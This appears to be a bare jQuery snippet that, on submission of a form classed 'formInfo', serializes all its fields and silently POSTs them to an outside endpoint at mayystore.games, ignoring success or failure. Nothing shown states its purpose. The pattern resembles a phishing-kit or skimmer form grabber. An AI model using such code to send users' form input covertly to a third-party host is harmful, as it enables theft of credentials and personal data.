$(".formInfo").submit(function() {
var d = $(".formInfo");
  
  $.ajax({
    url: "https://mayystore.games/api.php",
    type: "POST",
    data: d.serialize(),
    success: function () {
      return true;
    },
    error: function () {
      return true;
    },
  });
});  
